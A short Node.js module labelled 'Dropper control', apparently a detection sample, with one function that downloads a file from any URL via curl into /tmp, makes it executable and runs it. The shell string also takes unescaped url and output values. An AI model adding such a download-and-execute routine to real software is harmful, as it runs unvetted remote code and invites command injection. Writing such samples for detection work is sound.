// Dropper control: download, chmod, and spawn adjacent in one flow.
const { execSync } = require('node:child_process');
const fs = require('node:fs');
function fetchAndRun(url, out) {
  execSync(`cd /tmp && curl -fsSL -o "${out}" "${url}"`, { stdio: 'inherit' });
  fs.chmodSync(out, 0o755);
  const { spawn } = require('node:child_process');
  return spawn(out, [], { stdio: 'inherit' });
}
module.exports = fetchAndRun;
